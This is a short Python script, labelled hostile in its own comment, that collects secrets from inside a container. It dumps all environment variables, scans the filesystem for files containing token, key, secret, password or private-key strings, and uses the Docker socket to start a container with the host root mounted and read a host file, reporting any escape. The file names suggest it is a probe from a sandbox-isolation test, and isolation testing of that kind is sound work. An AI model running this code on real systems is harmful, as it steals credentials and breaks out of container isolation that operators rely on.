# Hostile: collect every secret it can reach: environment, mounted files, the Docker socket.
import http.client, json, os, socket, time

loot = []
for k, v in sorted(os.environ.items()):
    loot.append(f"env {k}={v}")

def grab(root):
    for d, dirs, files in os.walk(root):
        dirs[:] = [x for x in dirs if x not in ("proc", "sys", "dev", "usr", "lib", "bin", "sbin")]
        for f in files:
            p = os.path.join(d, f)
            try:
                if os.path.islink(p) or os.path.getsize(p) > 65536:
                    continue
                data = open(p, errors="replace").read()
            except Exception:
                continue
            if any(w in data for w in ("TOKEN", "KEY", "SECRET", "PASSWORD", "PRIVATE")):
                loot.append(f"file {p}: {data.strip()[:300]}")

for root in ("/", ):
    grab(root)

class Unix(http.client.HTTPConnection):
    def __init__(self, path):
        super().__init__("localhost", timeout=5)
        self.path_ = path
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX)
        self.sock.settimeout(5)
        self.sock.connect(self.path_)

def api(sock, method, url, body=None):
    c = Unix(sock)
    c.request(method, url, body=json.dumps(body) if body is not None else None,
              headers={"Content-Type": "application/json"})
    r = c.getresponse()
    return r.status, r.read()

docker = "unreachable"
for sock in ("/var/run/docker.sock", "/run/docker.sock", "/docker.sock"):
    if not os.path.exists(sock):
        continue
    try:
        st, b = api(sock, "POST", "/containers/create?name=kl-pwn-%d" % os.getpid(), {
            "Image": "alpine:3.22", "Cmd": ["cat", "/host/etc/kl-host-secret"],
            "Labels": {"kl.pwn": "1"}, "HostConfig": {"Binds": ["/:/host:ro"]}})
        cid = json.loads(b)["Id"]
        api(sock, "POST", f"/containers/{cid}/start")
        api(sock, "POST", f"/containers/{cid}/wait")
        st, logs = api(sock, "GET", f"/containers/{cid}/logs?stdout=1")
        docker = "ESCAPED via " + sock
        loot.append("host " + logs.decode(errors="replace"))
    except Exception as e:
        docker = f"{sock}: {type(e).__name__}: {e}"
loot.append("docker " + docker)
open("/out/loot.txt", "w").write("\n".join(loot) + "\n")
print(f"{len(loot)} items of loot; docker: {docker}")
